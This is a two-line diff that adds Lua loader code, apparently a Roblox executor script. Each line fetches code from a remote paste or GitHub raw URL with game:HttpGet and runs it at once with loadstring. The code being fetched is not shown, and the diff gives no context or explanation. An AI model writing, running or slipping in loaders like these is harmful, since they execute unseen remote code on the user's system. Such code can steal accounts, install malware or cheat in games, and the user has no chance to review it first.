@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/mutatetest/refs/heads/main/test"))()
+loadstring(game:HttpGet("https://pastefy.app/iIrNpQ3z/raw"))()
